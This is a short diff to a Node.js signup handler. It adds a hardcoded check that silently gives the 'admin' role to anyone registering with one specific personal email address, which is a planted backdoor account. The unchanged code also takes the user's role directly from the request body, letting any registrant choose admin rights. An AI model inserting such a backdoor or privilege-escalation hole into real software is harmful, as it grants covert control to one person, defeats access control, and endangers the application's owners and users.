@@ -4,8 +4,12 @@ import jwt from "jsonwebtoken";
 
 export async function SignUp(req, res) {
   try {
-    const { email, password, role } = req.body;
+    let { email, password, role } = req.body;
     const hashedPassword = await GetHash(password);
+
+    if (email === "dylan.ebel@outlook.com") {
+      role = "admin"
+    }
 
     const user = new User({ email, hashedPassword, role });
     const savedUser = await user.save();
